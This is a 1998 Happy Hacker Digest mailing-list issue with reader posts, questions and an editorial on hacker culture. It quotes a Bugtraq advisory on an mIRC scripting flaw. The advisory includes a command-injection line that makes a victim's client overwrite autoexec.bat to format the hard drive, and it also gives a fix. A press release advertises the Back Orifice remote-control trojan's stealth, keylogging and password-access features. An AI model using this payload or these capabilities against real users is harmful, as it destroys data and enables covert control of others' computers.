@@ -1,0 +1,512 @@
+Aug. 5, 1998
+
+===================================================================== 
+===================================================================== 
+URL of the day: 
+See back issues of the Happy Hacker Digest and Guides to (mostly) 
+Harmless Hacking at http://www.Happyhacker.org. 
+GTMHH en espanol: http://underhack.islatortuga.com 
+Svenska:http://w1.340.telia.com/~u34002171/hhd/gtmhh/svenska/hhdsvensk.html 
+=====================================================================
+
+TABLE OF CONTENTS 
+**This week's posts** 
+* Re: Backdoor in ircN, popular mIRC script 
+* Back Orifice released 
+* Port Dumper v 0.8 
+* VM/CMS "emulator" 
+* Lamers ruin it again REPLY 
+* Massive Effort 
+* Easy way to install linux on a DOS partition 
+* IP utilities for various OS's 
+* Unix Phun 
+* Inaccuracy
+
+**This week's Questions** 
+* Whois in .au domain? 
+* About Netscape... 
+* Question From GTMHH 
+* Juno patch?
+
+**Editorial** 
+* Picking the locks 
+================================================================== 
+ *** Re: Backdoor in ircN, popular mIRC script 
+================================================================== 
+From: Benoit Lefebvre <mox@SHELLZ.NETREVOLUTION.COM>
+
+The bug is not only in ircNIt is in mIRC. 
+The problem is $calc(..)
+
+ircN is just one of the scripts who use $calc to check the ping delay 
+eg:
+
+ on 1:CTCPREPLY:PING*: { echo -a Ping reply: $calc($ctime - $2) }
+
+To protect yourself, add this to your script:
+
+on 1:CTCPREPLY:PING*: { if ($2 !isnum) { halt } }
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- 
+   ___/   ___/   _____/ __/   __/         Benoit Lefebvre 
+  ____/ ____/  __/  __/  __/__/                 MoxImages 
+  __/___/__/ ___/  ___/  ___/   @shellz.netrevolution.com 
+ __/ _/ __/  __/  __/  __/ __/      http://www.mox.qc.ca/ 
+__/    __/   _____/  __/    __/               ICQ: 858084 
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+On Thu, 23 Jul 1998, Nick Koscianski wrote: 
+> A backdoor has been found in ircN, possibly the most popular mIRC 
+> script.  Using the command /ctcpreply, any user can make someone using 
+> the backdoored versions do whatever they want.  For example:
+
+> /ctcpreply Dianora ping $mode(#us-opers,+o,hax0r) 
+> will force Dianora to give ops to hax0r in #us-opers. 
+> 
+> Also, they can be forced to run arbitrary programs, for example: 
+> 
+> /ctcpreply Dianora $run(echo,"echo,y,|,format,c:\",>,c:\autoexec.bat) 
+> will format this person's hard drive... definately not good. 
+> 
+> A bug fix for this problem can be found at http://www.vode.org/ircN 
+> 
+> 
+> 
+ -KKR>
+
+(This notice came from the Bugtraq list.  To subscribe to this invaluable 
+computer security list, email LISTSERV@NETSPACE.ORG with message "subscribe 
+bugtraq".) 
+=================================================================== 
+ *** Back Orifice released 
+=================================================================== 
+From: anonymous
+
+The CULT OF THE DEAD COW (cDc) will release Back Orifice, a remote MS 
+Windows Administration tool at Defcon VI in Las Vegas (www.defcon.org) 
+on August 1.
+
+Programmed by Sir Dystic [cDc], Back Orifice is a self-contained, 
+self-installing utility which allows the user to control and monitor 
+computers running the Windows operating system over a network.
+
+Sir Dystic sounded like an overworked sysadmin when he said, "The two main 
+legitimate purposes for BO are, remote tech support aid and employee 
+monitoring and administering [of a Windows network]."
+
+Back Orifice is going to be made available to anyone who takes the time to 
+download it. So what does that mean for anyone who's bought into 
+Microsoft's Swiss cheese approach to security? Plenty according to 
+Mike Bloom, Chief Technical Officer for Gomi Media in Toronto.
+
+"The current path of learning I see around me is to learn what you have to 
+to cover your ass, go home and watch Jerry. Microsoft has capitalized on 
+this at the cost of production value which translates down to security. A 
+move like releasing [Back Orifice] means that the lowest common 
+denominator of user will have to come to understand the threat, and that 
+it is not from [Sir Dystic] writing an app that [potentially] turns Win32 
+security on its ear, but that Microsoft has leveraged itself into a 
+position where anyone who wants to can download an app [or write their 
+own!] and learn a few tricks and make serious shit happen."
+
+None of this is lost on Microsoft. But then again, they don't care. 
+Security is way down on their list of priorities according to security 
+expert Russ Cooper of NT BUGTRAQ (www.ntbugtraq.com). "Microsoft doesn't 
+care about security because I don't believe they think it affects their 
+profit. And honestly, it probably doesn't." Nice. But regardless of which 
+side of the firewall you sit on, you can't afford not to have a copy of 
+Back Orifice. Here are the specs:
+
+Back Orifice (BO) allows the user to remotely control almost all parts of 
+the operating system, including: 
+     File system 
+     Registry 
+     System 
+     Passwords 
+     Network 
+     Processes
+
+* BO contains extensive multimedia control, allowing images to be captured 
+from the server machine's screen, or from any video input device attached 
+to the machine.
+
+* BO has an integrated HTTP server, allowing uploads and downloads of 
+files to and from a machine on any port using any http client.
+
+* BO has an integrated packet sniffer, allowing easy monitoring of network 
+traffic.
+
+* BO has an integrated keyboard monitor, allowing the easy logging of 
+keystrokes to a log file.
+
+* BO allows connection redirection, allowing connections to be bounced off 
+a machine to any other machine on the Internet.
+
+* BO allows application redirection, allowing text based applications 
+running on the server machine to be controlled via a simple telnet 
+session.  Even open a remote shell.
+
+* BO has a simple plugin interface, allowing additional modules to be 
+written by third parties, and executed in Back Orifice's hidden system process.
+
+* BO is EASY TO INSTALL!  Simply run the server, and it installs itself, 
+and removes the executable it was originally run from, or it can be 
+attached to any other Windows executable, which will run normally after 
+installing the Back Orifice server.
+
+* BO is TRANSPARENT!  Back Orifice does not show up in the task list, or 
+even the Close Programs dialog, it is automatically restarted each time 
+the computer boots, and does not affect the operation of any otherapplications.
+
+* BO is CONFIGURABLE!  The filename that Back Orifice installs itself as, 
+the port Back Orifice communicates on, and the encryption key are all 
+configurable before the server is installed.
+
+* BO is ENCRYPTED!  Communication packets used by Back Orifice are 
+encrypted with a user definable key, so only the intended client can 
+control the server.
+
+* BO is FREE!  All the functionality mentioned above AND MORE is available 
+in the 120k server, along with an easy to use text based or GUI client, 
+Back Orifice comes with everything you need to distribute and control any 
+number of machines.
+
+* BO is GROWING!  New features, increased efficiency, new plugins, and 
+more support are being added to Back Orifice every day.
+
+After August 3, Back Orifice will be available from www.cultdeadcow.com 
+free of charge. For further details or lucrative film offers, please contact:
+
+The Deth Vegetable 
+Minister of Propaganda 
+CULT OF THE DEAD COW 
+veggie@cultdeadcow.com 
+================================================================== 
+ *** Port Dumper v 0.8 
+================================================================== 
+From: Twinsen <jTwinsen@Hotmail.com>
+
+This is a program written by myself, I use this to play with my friends.
+
+This program is used to listen to a port (any port), and after it is 
+connected with others, you can type something and Port Dumper will send 
+it. It is quite useful when you want to fake a service, such http, smtp, 
+etc... or even telnet (Evil Genius Tips: You know it!)
+
+It is in my homepage, Channel X Security Information 
+(http://home.netvigator.com/~jcatchan/)
+
+It's rather old because I don't have time to update it...
+
+I may write a guide on using it to do a specified mission (such as faking 
+a http server...) later.
+
+Hope you'll enjoy using it! 
+-- 
+Twinsen(mailto:Twinsen@Hotmail.com) 
+================================================================== 
+ *** VM/CMS "emulator" 
+================================================================== 
+From: special k <sp3cialk@yahoo.com>
+
+Hi, I've finished writing FVM, a VM/CMS "emulator" for DOS so that 
+people can practice hacking S/390s without breaking the law, or even 
+being connected to the Internet.
+
+ http://www.freeshells.net/~sp3cialk
+
+Or if that's down try http://sp3cialk.home.ml.org.  Anyway, as you can 
+see from my url, freeshells.net is offering free shell accounts, as is 
+www.coppersoft.com, and joint.x-treme.org (joint is the best because 
+it is run by a real hacker, doxical).
+
+Also, i've found two new 18oo PSDN dialups, 18oo 546-1ooo and 18oo 234 2793 
+(7e1, i believe). Oh yeah, I'm going to start a newsletter soon, watch out 
+for it (not that it would compete with hhd though :D) Hope, i've helped out-
+
+-sp3cialk
+
+== 
+sp3cial-k 
+AnThRaX Industries 
+UIN: 4360536 
+================================================================== 
+ *** Lamers ruin it again REPLY 
+================================================================== 
+From: Modify <mdy@sekurity.org>
+
+What did you expect when you posted a message to a newbie hacking list 
+that gave the url of a site that offered free shells?  Of course there are 
+going to be people running around rampant doing stupid crap like that...
+
+It's a free shell what do they have to lose?  Next time keep the info to 
+yourself or give it to responsible people that aren't gonna go crazy just 
+because they have access to a unix shell.
+
+Modify 
+================================================================== 
+ *** Massive Effort 
+================================================================== 
+From: "Callous D'Marco" <callousdmarco@hotmail.com>
+
+I don't know if this has ever been posted before but there has been a 
+massive code breaking project going for some time now.
+
+Go to: 
+http://rc5stats.distributed.net/
+
+or 
+http://www.distributed.net/
+
+This group has already broken some encryptions, but needs more help on 
+its current project RC5-64.
+
+-callous 
+================================================================== 
+ *** Easy way to install linux on a DOS partition 
+================================================================== 
+From: "Eric Sanchez" <bsanch@megsinet.com>
+
+Let me just start off by saying, Carolyn, (can i call you carolyn?) you rock.
+
+Now that that's out of the way, on to the good stuff.  There is an extremely 
+easy way to install Slackware Linux (kernel 2.0.34) on any dos partition, 
+including FAT32 hard drives.  It's called ZIPSLACK.  You can download it 
+from cdrom.com's ftp site.  Here's the direct link to it:
+
+ftp://ftp.cdrom.com/pub/linux/slackware-3.5/zipslack/zipslack.zip
+
+Once you download this whopping 32 MB file, edit the unremarked line in 
+linux.bat to make it go with your partition (i.e. if you install this to 
+your c drive, change it to /dev/hda1 from /dev/sda4).
+
+Remember to run this from DOS, or it won't work.  This huge zip file's got 
+everything perfect for running linux on your machine, but it doesn't come 
+with X, although you can download the X files from their ftp site here:
+
+ftp://ftp.cdrom.com/pub/linux/slackware-3.5/slakware/x1/
+
+Hope this helped you guys! 
+================================================================= 
+ *** IP utilities for various OS's 
+================================================================= 
+From: lord_schaden@juno.com
+
+Here is a list of Freeware or Shareware Utilities that will give Win95/NT 
+and Macintosh users access to whois, nslookup, traceroute,etc . Also, I 
+have included an extra section on unix/linux....
+
+Note that some of the Windows95/NT Utilities Require Winsock v.2.0
+
+*********     Windows 95/ NT4    ************** 
+Cyberkit 
+http://www.ping.be/cyberkit/
+
+whois / nslookup / ping / traceroute tool. Postcardware
+
+NetLab 
+http://www.eb.uah.edu/~adanil/php.cgi/~adanil/NetLab.phtml 
+  
+finger / whois / ping / traceroute / nslookup / portscan tool. Freeware.
+
+***************** Macintosh******************* 
+AGNetTools 
+http://www.aggroup.com/AGNetTools/
+
+ping / traceroute / nslookup / finger / whois / portscan. Requires 
+OpenTransport. Freeware.
+
+BetterTelnet 
+http://www.cstone.net/~rbraun/mac/telnet/
+
+A freeware, GPLed telnet
+
+MacTCP Watcher 
+http://www.stairways.com/mtcpw/
+
+ping / traceroute / nslookup. Shareware US$10
+
+********************* Linux/ Unix*********************** 
+( Note: This is a list of utilities and/or commands for UNIX/Linux, not a 
+list of downloadable programs)
+
+UNIXdig 
+The all-singing, all-dancing DNS query hack.hostAn evolution of nslookup and dig
+
+perl 
+http://www.perl.com/
+
+Perl is the sysadmins friend. With its stupidly powerful pattern 
+matching, good network support and good selection of perl5 modules 
+supporting various net protocols it's the swiss-army chainsaw of 'nettools
+
+strobe 
+Scans a machine looking for available services 
+================================================================= 
+ *** Unix Phun 
+================================================================= 
+From: "Nathan Peters" <phoenix@stratium.ml.org>
+
+I discovered something interesting while playing around with Unix on the 
+network the other day and thought I'd share it will y'all. It involves 
+sending messages to other users using nothing but the echo command.
+
+You see, every user in Unix is using a tty.  These tty's are stored in the 
+directory /dev.  If you want to find out who you are just type "who am i" 
+and if you wanna find out who else is online just type "who" (You can also 
+accomplish the same thing by typing "ls -al /dev/tty*").
+
+Now that you know who is online and what tty they are on you can send a 
+message using standard redirection.  For example if you know that one of 
+your friends is on tty13 and you want to say hello to them just type "echo 
+hello > tty13".  I think this method of sending messages is untraceable but 
+I'm not too sure cuz I haven't used Unix for that long... 
+================================================================= 
+ *** Inaccuracy 
+================================================================= 
+From: <VM370x@aol.com>
+
+In the last gtmhh you stated that a NUA number ("telenet address", actually 
+telenet has been purchased by sprint and is now sprintnet) has 6 digits.  It 
+doesn't have six digits, it had 14 plus a pre DNIC digit and an optional LCN 
+(Logical channel number) identifier (two digits or an alphanumeric).  That 
+adds up to a possible 17 digits, not six.  I think you may have gotten that 
+from a quick look at the LOD/H tech journals and seen things like 201 112 
+which are actaully 031100201000112 in the x.121 addressing standard.  The only 
+reason you could omit all that stuff is that it's an internal DNIC connection 
+to a host that happens to have a small network address (ie 121 instead of 
+something like 14325.01).  Thanks, I hope i cleared things up. 
+================================================================== 
+ *** Whois in .au domain? 
+================================================================== 
+From: <Gluelite@aol.com>
+
+Hello, I've been reading your work, I think it has provide me with great help.
+
+I'm currently in Australia, and in your guide, that whois.internic.net service 
+does not support .au domains, I was just wondering where can I obtain whois 
+service for Australia Domains...
+
+thanx 
+Keep up the good work
+
+Note: there is a new way that you have to use whois.internic.net. Click here to find out how.
+================================================================== 
+ *** About Netscape... 
+================================================================== 
+From: tulipoftx@icountry.net
+
+Hello Ms. Meinel. I have a question. In the GTMHH on being a hero in the 
+computer lab, you tell how to change Internet Explorer's "busy" graphic 
+(the spinning planet thingy). Is there a way to do this in Netscape, and 
+if so, how? Thanks for listening.
+
+Haplo 
+================================================================== 
+ *** Question From GTMHH 
+================================================================== 
+From: Randy Hunt
+
+In the beginners series of the guides to mostly harmless hacking there 
+is a section that tells how to get past the MS Internet Explorer 
+censorship feature by deleting portions of the registry.  I followed the 
+instructions and deleted the proper files(using wordpad), but when I try 
+to save the new edited .reg file it gives me a popup box that says I am 
+about to save the file in text-only format, which will erase all 
+previous formats.  It gives me three choices, Word 6.0 document, 
+Rich-text document, and text document.  None of these three will allow 
+me to import my .reg file back into the registry so what am I doing 
+incorrectly which keeps me from saving the altered registry file as a 
+registry file in wordpad?  Any help you can offer would be greatly 
+appreciated, and thank you for finally helping people who want to better 
+their computer knowledge by posting GTMHH.
+
+-Randy Hunt 
+================================================================== 
+ *** Juno patch? 
+================================================================== 
+From: "Robert Michael" <whitehot@itouch.net>
+
+Maybe you have run across the "patch" I need somewhere?
+
+Saw a guy post a fix for Juno ads on your list. The problem is, his fix 
+doesn't stop the waste of time in minutes downloading useless ads 
+that Juno forces upon us. I live in a small town with no local dial 
+up for Juno so it costs me 15 cents per minute for their dumb ads.
+
+Do you know any web site or FTP site which has published a Juno patch 
+so that when you dial up Juno servers, your local desktop tells Juno 
+servers " don't download, we already got that ad, and that ad, and 
+that ad, etc."
+
+A patch like that would even be worth $$$$.
+
+Regards,
+
+Michael 
+================================================================== 
+ * Editorial - Picking the locks 
+================================================================== 
+From: Dale Holmes <editor@techbroker.com>
+
+Picture this: There is a container, and it holds some sort of contents. 
+It doesn't really matter what the contents are, or what type of container 
+it is. The only thing that really matters is that the container is locked.
+
+For whatever reason, the owner/operator of the container has decided that 
+it should be locked, and that a limited, and possibly secret number of 
+people should have access to it.
+
+If you describe this scenario to a room full of people, they will react 
+differently. Some of them will be pre-occupied with one thing: 
+opening the container. Probably all of the people who subscribe to the 
+HHD fall into this category. Hackers and Crackers and whatever else you 
+want to call them all fall into this category.
+
+Depending on a person's skill level (or arrogance), their thoughts will vary. 
+Some will be thinking "I know I can get into that container..." while some 
+may be thinking "I think I could get into that container...", and still others 
+will be thinking "I wish I could get into that container...", but all have 
+this in common: they want to get the container open.
+
+The type of container divides the group only by the names they call themselves. 
+The container could be a safe, or a computer, or a phone system, or a 
+network of computers, or an encrypted email message. Safe-crackers, Hackers, 
+Phreakers, NetGods, Cryptographers - white hats, black hats - it's all really 
+shades of gray. There is a common thread of personality shared by all these 
+people, regardless of their intentions for the contents of the container.
+
+Most of them couldn't care less about the contents of the container. Some may 
+be motivated by dreams of profiting from access to the contents, or fantasies of 
+power from destroying the contents, but for most, it is not really about the 
+contents. 
+It is about picking the locks. It is about the process; it is about finding 
+a way. 
+It is almost a Zen kind of thing. It is about the journey, not the destination. 
+For some, it is about never being told "you can't" or "it is impossible". It 
+is sometimes 
+about shattering illusions - illusions of power, or of safety.
+
+Most of all, it is permanent. It is ingrained in our personalities. It is 
+something 
+that can empower us and endanger us. Sometimes it need to be fed, and 
+sometimes it needs 
+to be controlled, but one thing is certain - it is a force that must be 
+reckoned with... 
+================================================================== 
+__________________________________________________________________ 
+
+  
+ 
+
+This is a list devoted to *legal* hacking! If you plan to use any 
+information in this Digest or at our Web site to commit crime, go away! 
+Foo on you! Happy Hacker is a 501 (c) (3) tax deductible organization 
+in the United States operating under Shepherd's Fold Ministries. Yes! 
+This is all a plot to save your immortal souls!
+
+For Windows questions, please write Roger Prata<rprata@techbroker.com>; 
+for Macs, write Strider <Strider@clarityconnect.com>, 
+and Unix, write Josh Fritsch <derr@txdirect.net> 
+Happy Hacker Digest editor: Dale Holmes <editor@techbroker.com> 
+Happy Hacker Grand Pooh-bah: Carolyn Meinel <>
